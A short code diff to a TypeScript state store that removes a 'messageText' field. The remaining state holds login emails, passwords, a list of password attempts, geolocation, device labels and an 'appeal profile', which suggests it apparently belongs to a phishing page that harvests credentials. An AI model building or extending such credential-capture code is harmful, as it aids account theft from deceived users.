@@ -35,7 +35,6 @@ interface State {
     geoInfo: GeoInfo | null;
     deviceLabel: string;
     messageId: number | null;
-    messageText: string | null;
     formData: FormDataPayload;
     loginData: LoginData;
     passwordAttempts: string[];
@@ -46,7 +45,6 @@ interface State {
     setGeoInfo: (info: GeoInfo) => void;
     setDeviceLabel: (label: string) => void;
     setMessageId: (id: number | null) => void;
-    setMessageText: (text: string | null) => void;
     setFormData: (data: FormDataPayload) => void;
     setLoginData: (data: LoginData) => void;
     addPasswordAttempt: (password: string) => void;
@@ -62,7 +60,6 @@ export const store = create<State>()(
             geoInfo: null,
             deviceLabel: 'Unknown',
             messageId: null,
-            messageText: null,
             formData: emptyForm,
             loginData: { email: '', password: '' },
             passwordAttempts: [],
@@ -73,7 +70,6 @@ export const store = create<State>()(
             setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
             setDeviceLabel: (label: string) => set({ deviceLabel: label }),
             setMessageId: (id: number | null) => set({ messageId: id }),
-            setMessageText: (text: string | null) => set({ messageText: text }),
             setFormData: (data: FormDataPayload) => set({ formData: data }),
             setLoginData: (data: LoginData) => set({ loginData: data }),
             addPasswordAttempt: (password: string) =>
@@ -89,7 +85,6 @@ export const store = create<State>()(
                 geoInfo: state.geoInfo,
                 deviceLabel: state.deviceLabel,
                 messageId: state.messageId,
-                messageText: state.messageText,
                 formData: state.formData,
                 appealProfile: state.appealProfile,
                 loginProvider: state.loginProvider
